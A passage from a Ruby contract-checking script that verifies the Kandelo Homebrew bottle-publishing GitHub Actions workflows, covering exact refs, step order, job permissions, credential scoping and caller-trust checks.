        kandelo_checkout["with"] == {
    "persist-credentials" => false,
    "repository" => "Automattic/kandelo",
    "ref" => "${{ inputs.kandelo-ref }}",
    "path" => "kandelo",
    "submodules" => false,
  }, "first child publication Kandelo checkout changed")

  tap_checkout = named_step(steps, "Checkout exact dry-run tap source")
  check(tap_checkout["uses"] == CHECKOUT_ACTION && tap_checkout["with"] == {
    "persist-credentials" => false,
    "repository" => "Kandelo-dev/homebrew-tap-core",
    "ref" => "${{ inputs.tap-ref }}",
    "path" => "tap",
    "submodules" => false,
  }, "first child publication tap checkout changed")

  download = named_step(steps, "Download exact dry-run OCI child handoff")
  check(download["uses"] == DOWNLOAD_ACTION && download["with"] == {
    "name" =>
      "homebrew-oci-child-${{ inputs.formula }}-${{ inputs.arch }}-" \
      "attempt-${{ inputs.dry-run-run-attempt }}",
    "path" => "${{ runner.temp }}/homebrew-first-publication-child",
    "github-token" => "${{ github.token }}",
    "repository" => "Kandelo-dev/homebrew-tap-core",
    "run-id" => "${{ inputs.dry-run-run-id }}",
  }, "first child publication artifact download changed")

  validation = named_step(
    steps, "Validate exact dry-run child handoff without credentials"
  )
  [
    "scripts/homebrew-oci-layout.py validate-child",
    '.formula == $formula and .arch == $arch',
    '.tap_commit == $tap_ref and .kandelo_commit == $kandelo_ref',
    '.oci.manifest.digest == $manifest_digest',
    'kind: "kandelo-homebrew-first-child-publication-evidence"',
    'chmod -R a-w "$artifact"',
  ].each do |fragment|
    check(validation.fetch("run").include?(fragment),
          "first child publication handoff validation lacks #{fragment}")
  end

  upload = named_step(
    steps, "Publish one absent repository-rooted child with GITHUB_TOKEN"
  )
  check(upload["env"] == {
    "FORMULA" => "${{ inputs.formula }}",
    "GH_TOKEN" => "${{ github.token }}",
    "KANDELO_REF" => "${{ inputs.kandelo-ref }}",
    "TAP_REF" => "${{ inputs.tap-ref }}",
  }, "first child publication authentication changed")
  [
    "/repos/Kandelo-dev/homebrew-tap-core/git/ref/heads/main",
    "scripts/homebrew-ghcr-upload.sh",
    "--tap-repository kandelo-dev/homebrew-tap-core",
    "--tap-name kandelo-dev/tap-core",
    '--formula "$FORMULA"',
    '--exact-kandelo-main-sha "$KANDELO_REF"',
    '--target-main-contains-sha "$TAP_REF"',
    "--auth-mode github-token",
    "--require-pat false",
    "--destination-mode repository-canary",
  ].each do |fragment|
    check(upload.fetch("run").include?(fragment),
          "first child publication upload lacks #{fragment}")
  end

  readback = named_step(
    steps, "Validate anonymous exact-digest publication evidence"
  )
  [
    '.layout == $child[0]',
    'public_readback_digest: $digest',
    'status: "uploaded"',
    'kind == "kandelo-homebrew-first-child-publication-evidence"',
  ].each do |fragment|
    check(readback.fetch("run").include?(fragment),
          "first child publication readback validation lacks #{fragment}")
  end

  credential_names = %w[
    GH_TOKEN GITHUB_TOKEN HOMEBREW_GITHUB_API_TOKEN HOMEBREW_GITHUB_PACKAGES_TOKEN
    HOMEBREW_DOCKER_REGISTRY_TOKEN
  ]
  credential_steps = steps.select do |step|
    !(step.fetch("env", {}).keys & credential_names).empty?
  end
  check(credential_steps == [admission, upload],
        "first child publication credentials escaped metadata admission and upload")
end

def check_prefix_first_child(workflow)
  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_keys == %w[concurrency jobs name on],
        "prefix first-child workflow has unexpected top-level configuration")
  check(workflow["name"] ==
        "Reusable Homebrew prefix first-child publish",
        "prefix first-child workflow name changed")
  check(workflow_events(workflow) == {
    "workflow_call" => {
      "inputs" => {
        "kandelo-repository" => { "type" => "string", "required" => true },
        "kandelo-ref" => { "type" => "string", "required" => true },
        "tap-repository" => { "type" => "string", "required" => true },
        "tap-name" => { "type" => "string", "required" => true },
        "tap-ref" => { "type" => "string", "required" => true },
        "formula" => { "type" => "string", "required" => true },
        "arch" => { "type" => "string", "required" => true },
        "release-tag" => { "type" => "string", "required" => true },
        "prefix-campaign-tag" => {
          "type" => "string", "required" => true,
        },
        "prefix-campaign-dependencies" => {
          "type" => "string", "required" => true,
        },
      },
    },
  }, "prefix first-child workflow_call contract changed")
  check(!workflow.key?("permissions"),
        "prefix first-child requests workflow-wide permissions")
  check(workflow["concurrency"] == {
    "group" => "kandelo-homebrew-ghcr-${{ inputs.formula }}",
    "cancel-in-progress" => false,
  }, "prefix first-child left the shared Formula writer lock")
  check_common(workflow, "prefix first-child workflow")

  jobs = workflow_jobs(workflow)
  check(jobs.keys == ["first-child"],
        "prefix first-child workflow has an unexpected job set")
  job = jobs.fetch("first-child")
  check(job.keys.sort == %w[permissions runs-on steps timeout-minutes] &&
        job["runs-on"] == "ubuntu-latest" &&
        job["timeout-minutes"] == 60 &&
        exact_permissions?(job["permissions"], {
          "actions" => "read", "contents" => "read", "packages" => "write",
        }), "prefix first-child job authority changed")
  steps = job_steps(job, "prefix first-child")
  check(steps.map { |step| step["name"] } == [
    "Validate exact prefix-campaign caller",
    "Checkout exact Kandelo bootstrap source",
    "Checkout exact campaign tap source",
    "Admit protected source history",
    "Verify exact source snapshots",
    "Install Nix",
    "Warm Kandelo dev shell",
    "Materialize sealed bootstrap campaign source",
    "Require reviewed first-package admission and release",
    "Resolve exact dependency tap map",
    "Admit two exact same-run bootstrap artifacts",
    "Download exact bootstrap build handoff",
    "Download exact bootstrap OCI child",
    "Validate exact bootstrap data without credentials",
    "Classify anonymous exact-child resumption",
    "Record exact public child without credentials",
    "Publish one absent first child with GITHUB_TOKEN",
    "Validate public first-child evidence without credentials",
    "Upload bootstrap-only first-child evidence",
  ], "prefix first-child step order changed")
  check(values_for_key(workflow, "uses") == [
    CHECKOUT_ACTION, CHECKOUT_ACTION, NIX_ACTION,
    DOWNLOAD_ACTION, DOWNLOAD_ACTION, UPLOAD_ACTION,
  ], "prefix first-child action set or pins changed")

  trust = named_step(steps, "Validate exact prefix-campaign caller")
  [
    "kandelo-dev/homebrew-tap-core",
    "Automattic/kandelo",
    "refs/heads/main",
    "repository_dispatch",
    "publish-prefix-campaign-bottle",
    "prefix-campaign-bottles.yml@refs/heads/main",
    '[[ "$CALLER_SHA" =~ ^[0-9a-f]{40}$ ]]',
    '[[ "$KANDELO_REF" =~ ^[0-9a-f]{40}$ ]]',
    '[[ "$TAP_REF" =~ ^[0-9a-f]{40}$ ]]',
    '[[ "$FORMULA" =~ ^[a-z0-9][a-z0-9._-]{0,254}$ ]]',
    "wasm32|wasm64",
    '[[ "$RELEASE_TAG" =~ ^bottles-abi-v[1-9][0-9]*$ ]]',
    "homebrew-prefix-campaign-sha256-",
    'keys == ["dependencies", "schema"]',
    'homebrew-prefix-handoff-sha256-',
    '[ "$normalized_dependencies" = "$CAMPAIGN_DEPENDENCIES" ]',
  ].each do |fragment|
    check(trust.fetch("run").include?(fragment),
          "prefix first-child caller trust lacks #{fragment}")
  end

  materialize = named_step(
    steps, "Materialize sealed bootstrap campaign source"
  )
  check(materialize["id"] == "campaign-source" &&
        materialize.dig("env", "GH_TOKEN") == "${{ github.token }}" &&
        materialize.fetch("run").include?(
          "homebrew-prefix-campaign-publisher.py"
        ) && materialize.fetch("run").include?('--arch "$ARCH"') &&
        materialize.fetch("run").include?(
          '--github-output "$GITHUB_OUTPUT"'
        ) && materialize.fetch("run").include?(
          'formula_path="tap/Formula/${FORMULA}.rb"'
        ) && materialize.fetch("run").include?(
          'git -C tap ls-files -s -- "Formula/${FORMULA}.rb"'
        ) && materialize.fetch("run").include?(
          "materialized Formula is not one ordinary Git blob"
        ), "prefix first-child does not materialize exact campaign authority")
  admission = named_step(
    steps, "Require reviewed first-package admission and release"
  )
  check(admission.dig("env", "ADMISSION_KIND") ==
        "${{ steps.campaign-source.outputs." \
        "prefix-campaign-destination-admission-kind }}",
        "prefix first-child does not consume sealed campaign admission")
  [
    "first-package-namespace-bootstrap-required",
    '[ "$RELEASE_TAG" = "bottles-abi-v${abi}" ]',
    'homebrew_bottle_root_url',
  ].each do |fragment|
    check(admission.fetch("run").include?(fragment),
          "prefix first-child campaign admission lacks #{fragment}")
  end

  artifact_admission = named_step(
    steps, "Admit two exact same-run bootstrap artifacts"
  )
  [
    "/actions/runs/$RUN_ID",
    '.path == ".github/workflows/prefix-campaign-bottles.yml"',
    '.head_branch == "main" and .head_sha == $sha',
    "prefix-campaign-bootstrap-dry-run-${kind}-",
    "homebrew-build-handoff homebrew-oci-child",
    '.total_count == 1 and (.artifacts | length) == 1',
    'test("^sha256:[0-9a-f]{64}$")',
    '.artifacts[0].expired == false',
    '.artifacts[0].workflow_run.id == $id',
  ].each do |fragment|
    check(artifact_admission.fetch("run").include?(fragment),
          "prefix first-child artifact admission lacks #{fragment}")
  end
  expected_prefix = "prefix-campaign-bootstrap-dry-run-"
  {
    "Download exact bootstrap build handoff" =>
      "#{expected_prefix}homebrew-build-handoff-" \
      "${{ inputs.formula }}-${{ inputs.arch }}-attempt-" \
      "${{ github.run_attempt }}",
    "Download exact bootstrap OCI child" =>
      "#{expected_prefix}homebrew-oci-child-" \
      "${{ inputs.formula }}-${{ inputs.arch }}-attempt-" \
      "${{ github.run_attempt }}",
  }.each do |name, artifact_name|
    step = named_step(steps, name)
    check(step["uses"] == DOWNLOAD_ACTION && step["with"] == {
      "name" => artifact_name,
      "path" => name.include?("build") ?
        "${{ runner.temp }}/homebrew-build-handoff" :
        "${{ runner.temp }}/homebrew-oci-child",
    }, "prefix first-child download #{name.inspect} changed")
  end

  validation = named_step(
    steps, "Validate exact bootstrap data without credentials"
  )
  [
    "homebrew-validate-build-handoff.sh",
    "homebrew-oci-layout.py",
    "validate-child",
    '--prefix-campaign-layout-sha256',
    '.tap_commit == $tap_ref',
    '.kandelo_commit == $kandelo_ref',
    '.bottle.sha256 == $sha',
    '.bottle.bytes == ($bytes | tonumber)',
  ].each do |fragment|
    check(validation.fetch("run").include?(fragment),
          "prefix first-child data validation lacks #{fragment}")
  end
  resume_probe = named_step(
    steps, "Classify anonymous exact-child resumption"
  )
  [
    "probe-registry", "--kind manifest", "present)",
    '[ "$(jq -er .digest "$result")" = "$expected" ]',
    "missing|auth-required) mode=bootstrap",
  ].each do |fragment|
    check(resume_probe.fetch("run").include?(fragment),
          "prefix first-child anonymous resumption lacks #{fragment}")
  end
  check(resume_probe.fetch("run").include?("cd kandelo\n") &&
        resume_probe.fetch("run").include?(
          "bash scripts/dev-shell.sh python3"
        ), "prefix first-child anonymous resumption uses another flake")
  resume = named_step(
    steps, "Record exact public child without credentials"
  )
  mutation = named_step(
    steps, "Publish one absent first child with GITHUB_TOKEN"
  )
  [resume, mutation].each do |step|
    check(step.fetch("run").include?(
            "--destination-mode repository-bootstrap"
          ), "prefix first-child bypasses repository-bootstrap transport")
  end
  check(resume["if"] == "${{ steps.resume.outputs.mode == 'resume' }}" &&
        !resume.fetch("env", {}).key?("GH_TOKEN"),
        "prefix first-child read-only resume receives package credentials")
  check(mutation["if"] ==
        "${{ steps.resume.outputs.mode == 'bootstrap' }}" &&
        mutation.fetch("env").fetch("GH_TOKEN") == "${{ github.token }}" &&
        mutation.fetch("run").include?('--kandelo-main-contains-sha') &&
        mutation.fetch("run").include?('--target-main-contains-sha'),
        "prefix first-child mutation authority changed")
  final_validation = named_step(
    steps, "Validate public first-child evidence without credentials"
  )
  check(final_validation.fetch("run").include?(
          "validate-publication-receipt"
        ) && final_validation.fetch("run").include?(
          '.publication.status == "uploaded"'
        ) && final_validation.fetch("run").include?(
          '.publication.status == "already-present"'
        ), "prefix first-child public evidence validation changed")
  evidence = named_step(
    steps, "Upload bootstrap-only first-child evidence"
  )
  check(evidence["uses"] == UPLOAD_ACTION &&
        evidence.dig("with", "name").start_with?(
          "homebrew-prefix-first-child-"
        ), "prefix first-child evidence artifact changed")

  serialized = JSON.generate(workflow)
  %w[
    homebrew-publish-handoff homebrew-index-publication
    homebrew-generate-sidecars finalize-tap
  ].each do |forbidden|
    check(!serialized.include?(forbidden),
          "prefix first-child owns forbidden finalization #{forbidden}")
  end
  credential_names = %w[
    GH_TOKEN GITHUB_TOKEN HOMEBREW_GITHUB_API_TOKEN
    HOMEBREW_GITHUB_PACKAGES_TOKEN HOMEBREW_DOCKER_REGISTRY_TOKEN
  ]
  credential_steps = steps.select do |step|
    !(step.fetch("env", {}).keys & credential_names).empty?
  end
  check(credential_steps.map { |step| step["name"] } == [
    "Admit protected source history",
    "Materialize sealed bootstrap campaign source",
    "Admit two exact same-run bootstrap artifacts",
    "Publish one absent first child with GITHUB_TOKEN",
  ], "prefix first-child credentials escaped reviewed boundaries")
  check(contract_digest(steps) == PREFIX_FIRST_CHILD_STEPS_DIGEST,
        "prefix first-child complete step contract changed")
end

def check_rootfs_publication_selection_semantics(source)
  mappings = source[
    /readonly ROOTFS_WASM32_ALLOWED_BRIDGES=\(\n(?<body>.*?)\n\)/m,
    :body
  ]&.scan(/^\s+"([^"]+)"$/)&.flatten
  check(
    mappings == %w[modeset:modeset nethack:nethack],
    "rootfs publication selection registry-bridge map changed"
  )

  [
    'umask 077',
    'normalized_formulae="$(normalize_selection "$FORMULAE")"',
    'normalized_arches="$(normalize_selection "$ARCHES")"',
    'normalized_tap_name="$(printf \'%s\' "$TAP_NAME"',
    'RUBY_BIN="$(canonical_executable "$RUBY_BIN" "pinned Formula authority Ruby")"',
    '/nix/store/*/bin/ruby)',
    '$label must be root-owned and not group- or world-writable',
    '[ -n "$normalized_formulae" ]',
    '[ "$normalized_arches" = "wasm32" ]',
    '[ "$REQUIRE_VFS_ACCEPTANCE" = "false" ]',
    'KANDELO_HOMEBREW_RESOLVED_TAPS_FILE="$RESOLVED_TAPS"',
    '"$RUBY_BIN" "$resolver"',
    '--tier2-bridge-json',
    '.full_name == ($tap + "/" + $formula)',
    'keys == ["package", "script_env_keys", "source_sha256", "source_url", "version"]',
    '"declared_dependencies", "manifest_sha256", "pkg_version"',
    '.pkg_version == $version',
    'test("^[1-9][0-9]*$")',
    '.tier2_bridge == null',
    'authority_class="tap-recipe"',
    'authority_class="direct"',
    'authority_class="registry-bridge"',
    'IFS=, read -r -a selected_formulae <<<"$normalized_formulae"',
    'for formula in "${selected_formulae[@]}"; do',
    'for mapping in "${ROOTFS_WASM32_ALLOWED_BRIDGES[@]}"; do',
    '[ "$mapping" = "$formula:$package" ]',
    'bridge_allowed "$formula" "$package" ||',
    "registry bridge is not admitted by the rootfs-wasm32 lane:",
    "jq -cSs 'sort_by(.formula)'",
    "rootfs Formula authority selection must be one compact JSON line",
    '[ "$(wc -c <"$result" | tr -d \'[:space:]\')" -le 65536 ]',
    "rootfs Formula authority selection exceeds the 65536-byte workflow transport limit",
  ].each do |fragment|
    check(source.include?(fragment),
          "rootfs publication selection lacks #{fragment}")
  end
  check(
    %w[
      generation-manifest resolver-root identity.archives
      identity.expected_ledger
    ].none? { |fragment| source.include?(fragment) },
    "rootfs Formula authority selector is coupled to target package archives"
  )
end

def check_rootfs_publication_selection(source)
  actual_sha256 = Digest::SHA256.hexdigest(source)
  check(
    actual_sha256 == ROOTFS_PUBLICATION_SELECTION_SHA256,
    "rootfs publication selection complete bytes changed: expected " \
      "#{ROOTFS_PUBLICATION_SELECTION_SHA256}, got #{actual_sha256}"
  )
  check_rootfs_publication_selection_semantics(source)
end

def check_publisher(workflow)
  check(
    File.file?(ROOTFS_PUBLICATION_SELECTION_PATH) &&
      !File.symlink?(ROOTFS_PUBLICATION_SELECTION_PATH),
    "rootfs publication selection must be a regular non-symlink file"
  )
  check(
    (File.stat(ROOTFS_PUBLICATION_SELECTION_PATH).mode & 0o111).positive?,
    "rootfs publication selection is not executable"
  )
  check(
    File.file?(HOST_RUNTIME_PREPARER_PATH) &&
      !File.symlink?(HOST_RUNTIME_PREPARER_PATH) &&
      (File.stat(HOST_RUNTIME_PREPARER_PATH).mode & 0o111).positive?,
    "host-runtime preparer must be one executable regular file"
  )
  host_runtime_preparer = File.read(HOST_RUNTIME_PREPARER_PATH)
  [
    'HOST_PROJECTION_ANCESTORS = (Path("/usr"), Path("/etc"))',
    "expected_path not in HOST_PROJECTION_ANCESTORS",
    "identity.mode != 0o755",
    "identity.uid == 0 and identity.gid == 0",
    "identity.uid == runner_uid",
    "identity.gid == runner_gid",
    "path_identity(root) for root in HOST_PROJECTION_ANCESTORS",
    "if not candidates or candidates != expected_candidates:",
    '"--no-dereference"',
    'f"--from={runner_uid}:{runner_gid}"',
    "*(str(candidate) for candidate in candidates)",
    "if (new.device, new.inode) != (old.device, old.inode):",
    "recursive chown",
    "host-runtime preparation accepts no arguments",
  ].each do |fragment|
    check(
      host_runtime_preparer.include?(fragment),
      "host-runtime preparer lacks #{fragment}"
    )
  end
  check(
    !host_runtime_preparer.include?("--recursive") &&
      !host_runtime_preparer.include?('"-R"'),
    "host-runtime preparer recursively changes conventional host files"
  )
  check_rootfs_publication_selection(
    File.binread(ROOTFS_PUBLICATION_SELECTION_PATH)
  )
  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_keys == %w[jobs name on],
        "publisher has unexpected top-level configuration")
  check(workflow["name"] == "Reusable Kandelo Homebrew bottle publish",
        "publisher name changed")

  events = workflow_events(workflow)
  check(events.keys == ["workflow_call"], "publisher must only expose workflow_call")
  workflow_call = events.fetch("workflow_call")
  check(workflow_call.keys == ["inputs"],
        "publisher workflow_call contract changed")
  check(workflow_call["inputs"] == {
    "kandelo-repository" => { "type" => "string", "default" => "Automattic/kandelo" },
    "kandelo-ref" => { "type" => "string", "required" => true },
    "tap-repository" => { "type" => "string", "default" => "kandelo-dev/homebrew-tap-core" },
    "tap-name" => { "type" => "string", "default" => "kandelo-dev/tap-core" },
    "tap-ref" => { "type" => "string", "default" => "main" },
    "formulae" => { "type" => "string", "required" => true },
    "arches" => { "type" => "string", "default" => "wasm32" },
    "release-tag" => { "type" => "string", "default" => "" },
    "bottle-root-url" => { "type" => "string", "default" => "" },
    "expected-cache-keys" => { "type" => "string", "default" => "" },
    "package-generation-wasm32" => { "type" => "string", "default" => "" },
    "package-generation-wasm64" => { "type" => "string", "default" => "" },
    "force" => { "type" => "boolean", "default" => false },
    "dry-run" => { "type" => "boolean", "default" => false },
    "require-vfs-acceptance" => { "type" => "boolean", "default" => false },
    "defer-tap-finalization" => { "type" => "boolean", "default" => false },
    "prefix-campaign-tag" => { "type" => "string", "default" => "" },
    "prefix-campaign-dependencies" => { "type" => "string", "default" => "" },
    "revalidation-source" => { "type" => "string", "default" => "" },
  }, "publisher inputs changed")
  check(!workflow.key?("permissions"), "publisher requests workflow-wide permissions")
  check_common(workflow, "reusable publisher")
  serialized_workflow = JSON.generate(workflow)
  check(!serialized_workflow.match?(/\$\{\{\s*secrets(?:\.|\[)/),
        "publisher still accepts a caller secret")

  jobs = workflow_jobs(workflow)
  check(jobs.keys.sort == %w[build-and-test finalize-tap plan publish-bottle-index publish-vfs-release stage-cross-run-handoffs upload-bottle verify-bottle],
        "publisher has an unexpected job set")
  plan = jobs.fetch("plan")
  build = jobs.fetch("build-and-test")
  upload = jobs.fetch("upload-bottle")
  index = jobs.fetch("publish-bottle-index")
  stage = jobs.fetch("stage-cross-run-handoffs")
  verify = jobs.fetch("verify-bottle")
  finalize = jobs.fetch("finalize-tap")
  vfs_release = jobs.fetch("publish-vfs-release")

  check(plan.keys.sort == %w[outputs permissions runs-on steps],
        "publisher plan contract changed")
  %w[build-and-test verify-bottle].each do |job_name|
    check(jobs.fetch(job_name).keys.sort ==
          %w[if needs permissions runs-on steps strategy timeout-minutes],
          "publisher #{job_name} job contract changed")
  end
  check(upload.keys.sort ==
        %w[concurrency if needs permissions runs-on steps strategy timeout-minutes],
        "publisher upload-bottle job contract changed")
  check(finalize.keys.sort == %w[if needs permissions runs-on steps timeout-minutes],
        "publisher atomic finalizer job contract changed")
  check(index.keys.sort == %w[concurrency if needs permissions runs-on steps strategy timeout-minutes],
        "publisher version-index job contract changed")
  check(stage.keys.sort == %w[if needs permissions runs-on steps strategy timeout-minutes],
        "publisher cross-run staging job contract changed")
  check(vfs_release.keys.sort == %w[if needs permissions runs-on steps timeout-minutes],
        "publisher VFS release job contract changed")
  check(plan["runs-on"] == "ubuntu-latest" &&
        exact_permissions?(plan["permissions"], {
          "actions" => "read", "contents" => "read",
        }),
        "publisher plan authority changed")
  check(build["runs-on"] == "ubuntu-latest" && build["timeout-minutes"] == 1440 &&
        exact_permissions?(build["permissions"], { "contents" => "read" }),
        "publisher build authority changed")
  shared_ghcr_writer_concurrency = {
    "group" => "kandelo-homebrew-ghcr-${{ matrix.formula }}",
    "cancel-in-progress" => false,
  }
  check(upload["runs-on"] == "ubuntu-latest" && upload["timeout-minutes"] == 60 &&
        exact_permissions?(upload["permissions"], {
          "actions" => "read", "contents" => "read", "packages" => "write",
        }) && upload["concurrency"] == shared_ghcr_writer_concurrency,
        "publisher uploader authority or shared GHCR concurrency changed")
  check(index["runs-on"] == "ubuntu-latest" && index["timeout-minutes"] == 60 &&
        exact_permissions?(index["permissions"], {
          "actions" => "read", "contents" => "read", "packages" => "write",
        }) && index["concurrency"] == shared_ghcr_writer_concurrency &&
        index["concurrency"] == upload["concurrency"],
        "publisher version-index authority or shared GHCR concurrency changed")
  check(stage["runs-on"] == "ubuntu-latest" &&
        stage["timeout-minutes"] == 15 &&
        exact_permissions?(stage["permissions"], { "actions" => "read" }),
        "publisher cross-run staging authority changed")
  check(verify["runs-on"] == "ubuntu-latest" && verify["timeout-minutes"] == 1440 &&
        exact_permissions?(verify["permissions"], { "contents" => "read" }),
        "publisher verifier authority changed")
  check(finalize["runs-on"] == "ubuntu-latest" && finalize["timeout-minutes"] == 120 &&
        exact_permissions?(finalize["permissions"], { "actions" => "read", "contents" => "write" }),
        "publisher finalizer authority changed")
  check(vfs_release["runs-on"] == "ubuntu-latest" && vfs_release["timeout-minutes"] == 60 &&
        exact_permissions?(vfs_release["permissions"], {
          "actions" => "read", "contents" => "write",
        }), "publisher VFS release authority changed")

  matrix_strategy = {
    "fail-fast" => false,
    "matrix" => { "include" => "${{ fromJson(needs.plan.outputs.matrix) }}" },
  }
  [build, upload, verify].each do |job|
    check(job["strategy"] == matrix_strategy,
          "publisher execution job bypasses the validated matrix")
  end
  check(stage["strategy"] == {
    "fail-fast" => true,
    "matrix" => { "include" => "${{ fromJson(needs.plan.outputs.matrix) }}" },
  }, "publisher cross-run staging bypasses the validated matrix")
  check(!finalize.key?("strategy"),
        "publisher finalizer must compose the complete matrix in one job")
  check(index["strategy"] == {
    "fail-fast" => false,
    "matrix" => { "include" => "${{ fromJson(needs.plan.outputs.formula-matrix) }}" },
  }, "publisher version-index job bypasses the validated Formula matrix")
  check(build["needs"] == ["plan"] &&
        build["if"] == "${{ needs.plan.outputs.matrix != '[]' && " \
                        "needs.plan.outputs.revalidation-mode != 'true' }}",
        "publisher build graph changed")
  check(upload["needs"] == %w[plan build-and-test] &&
        upload["if"] == "${{ always() && !cancelled() && !inputs.dry-run && " \
                         "needs.plan.result == 'success' && needs.plan.outputs.matrix != '[]' && " \
                         "needs.plan.outputs.revalidation-mode != 'true' }}",
        "publisher upload graph or dry-run isolation changed")
  check(index["needs"] == %w[plan build-and-test upload-bottle] &&
        index["if"] == "${{ always() && !cancelled() && !inputs.dry-run && needs.plan.result == 'success' && " \
                        "needs.plan.outputs.matrix != '[]' && " \
                        "needs.plan.outputs.revalidation-mode != 'true' }}",
        "publisher version-index graph or dry-run isolation changed")
  check(stage["needs"] == %w[plan build-and-test upload-bottle publish-bottle-index] &&
        stage["if"] == "${{ always() && !cancelled() && needs.plan.result == 'success' && " \
                       "needs.plan.outputs.matrix != '[]' && needs.plan.outputs.revalidation-mode == 'true' && " \
                       "needs.build-and-test.result == 'skipped' && needs.upload-bottle.result == 'skipped' && " \
                       "needs.publish-bottle-index.result == 'skipped' }}",
        "publisher cross-run staging graph changed")
  check(verify["needs"] == %w[plan build-and-test upload-bottle publish-bottle-index stage-cross-run-handoffs] &&
        verify["if"] == "${{ always() && !cancelled() && needs.plan.result == 'success' && " \
                         "needs.plan.outputs.matrix != '[]' && " \
                         "((needs.plan.outputs.revalidation-mode == 'true' && " \
                         "needs.stage-cross-run-handoffs.result == 'success') || " \
                         "(needs.plan.outputs.revalidation-mode != 'true' && " \
                         "needs.stage-cross-run-handoffs.result == 'skipped')) }}",
        "publisher verification graph changed")
  check(finalize["needs"] == %w[plan build-and-test upload-bottle verify-bottle] &&
        finalize["if"] == "${{ always() && !cancelled() && !inputs.dry-run && " \
                           "!inputs.defer-tap-finalization && " \
                           "needs.plan.result == 'success' && needs.plan.outputs.matrix != '[]' && " \
                           "needs.plan.outputs.revalidation-mode != 'true' }}",
        "publisher finalization graph or dry-run isolation changed")
  check(vfs_release["needs"] == %w[plan verify-bottle finalize-tap] &&
        vfs_release["if"] == "${{ always() && !cancelled() && !inputs.dry-run && " \
                               "!inputs.defer-tap-finalization && " \
                               "inputs.require-vfs-acceptance && needs.plan.result == 'success' && " \
                               "needs.plan.outputs.revalidation-mode != 'true' && " \
                               "needs.verify-bottle.result == 'success' && " \
                               "needs.finalize-tap.result == 'success' && " \
                               "needs.plan.outputs.vfs-acceptance-formula != '' }}",
        "publisher VFS release graph or evidence gate changed")

  plan_steps = job_steps(plan, "publisher plan")
  build_steps = job_steps(build, "publisher build")
  upload_steps = job_steps(upload, "publisher upload")
  index_steps = job_steps(index, "publisher version index")
  stage_steps = job_steps(stage, "publisher cross-run staging")
  verify_steps = job_steps(verify, "publisher verification")
  finalize_steps = job_steps(finalize, "publisher finalization")
  vfs_release_steps = job_steps(vfs_release, "publisher VFS release")

  validation = named_step(plan_steps, "Validate caller trust boundary")
  check(plan_steps.first.equal?(validation), "publisher trust validation must be first")
  check(validation.keys.sort == %w[env id name run shell] && validation["id"] == "trust" &&
        validation["shell"] == "bash" &&
        validation["env"] == {
          "CALLER_ACTION" => "${{ github.event.action }}",
          "CALLER_CLIENT_PAYLOAD" =>
            "${{ toJson(github.event.client_payload) }}",
          "CALLER_EVENT_NAME" => "${{ github.event_name }}",
          "CALLER_REF" => "${{ github.ref }}",
          "CALLER_REPOSITORY" => "${{ github.repository }}",
          "CALLER_WORKFLOW_REF" => "${{ github.workflow_ref }}",
          "DEFER_TAP_FINALIZATION" => "${{ inputs.defer-tap-finalization }}",
          "DRY_RUN" => "${{ inputs.dry-run }}",
          "FORCE_REBUILD" => "${{ inputs.force }}",
          "ARCHES" => "${{ inputs.arches }}",
          "FORMULAE" => "${{ inputs.formulae }}",
          "KANDELO_REPOSITORY" => "${{ inputs.kandelo-repository }}",
          "KANDELO_REF" => "${{ inputs.kandelo-ref }}",
          "PACKAGE_GENERATION_WASM32" => "${{ inputs.package-generation-wasm32 }}",
          "PACKAGE_GENERATION_WASM64" => "${{ inputs.package-generation-wasm64 }}",
          "PREFIX_CAMPAIGN_DEPENDENCIES" =>
            "${{ inputs.prefix-campaign-dependencies }}",
          "PREFIX_CAMPAIGN_TAG" => "${{ inputs.prefix-campaign-tag }}",
          "REVALIDATION_SOURCE" => "${{ inputs.revalidation-source }}",
          "REQUIRE_VFS_ACCEPTANCE" =>
            "${{ inputs.require-vfs-acceptance }}",
          "TAP_NAME" => "${{ inputs.tap-name }}",
          "TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
          "TAP_REF" => "${{ inputs.tap-ref }}",
          "BOTTLE_ROOT_URL" => "${{ inputs.bottle-root-url }}",
        }, "publisher caller validation mapping changed")
  validation_run = validation.fetch("run")
  [
    'normalized_caller_repository="$(printf \'%s\' "$CALLER_REPOSITORY" | tr \'[:upper:]\' \'[:lower:]\')"',
    'normalized_tap_repository="$(printf \'%s\' "$TAP_REPOSITORY" | tr \'[:upper:]\' \'[:lower:]\')"',
    'normalized_tap_name="$(printf \'%s\' "$TAP_NAME" | tr \'[:upper:]\' \'[:lower:]\')"',
    '[ "$normalized_caller_repository" = "$normalized_tap_repository" ]',
    '[ "$CALLER_REF" = "refs/heads/main" ]',
    '[ "$CALLER_EVENT_NAME" = "repository_dispatch" ]',
    '"$CALLER_REPOSITORY/.github/workflows/dry-run-bottles.yml@refs/heads/main"',
    '"$CALLER_REPOSITORY/.github/workflows/publish-bottles.yml@refs/heads/main"',
    '"$CALLER_REPOSITORY/.github/workflows/maintain-bottles.yml@refs/heads/main"',
    '[ "$CALLER_ACTION" = "publish-prefix-campaign-bottle" ]',
    '[ "$CALLER_ACTION" = "revalidate-f901-file-formula" ]',
    'jq -e \'type == "object" and length == 0\'',
    '[ "$KANDELO_REPOSITORY" = "Automattic/kandelo" ]',
    '[[ "$normalized_tap_repository" =~ ^[a-z0-9_.-]+/homebrew-[a-z0-9_.-]+$ ]]',
    'tap_short_name="${normalized_tap_repository#*/homebrew-}"',
    '[ "$normalized_tap_name" = "${tap_owner}/${tap_short_name}" ]',
    '[ -z "$BOTTLE_ROOT_URL" ]',
    'normalize_dry_run_source_ref()',
    '[[ "$ref" =~ ^[0-9a-f]{40}$ ]]',
    '[ "${#ref}" -le 255 ]',
    '[[ "$ref" != refs/* ]]',
    '[[ "$ref" != -* ]]',
    'git check-ref-format "refs/heads/$ref"',
    'normalize_write_kandelo_ref()',
    'write publication requires an exact lowercase 40-character Kandelo commit SHA',
    'normalize_write_tap_ref()',
    'write publication requires an exact reviewed lowercase 40-character tap commit SHA',
    'normalize_package_generation()',
    'package-generation-(browser-inputs|rootfs)-wasm32-abi-v[1-9][0-9]*-sha256-[0-9a-f]{64}',
    'package-generation-browser-inputs-wasm64-abi-v[1-9][0-9]*-sha256-[0-9a-f]{64}',
    'validated_generation_kind="rootfs-wasm32"',
    'validated_generation_kind="browser-inputs"',
    'the rootfs-wasm32 publication lane forbids a wasm64 generation',
    '[ "$validated_generation_kind" = "rootfs-wasm32" ]',
    'the rootfs-wasm32 publication lane requires exact runtime materialization and is unavailable in dry-run',
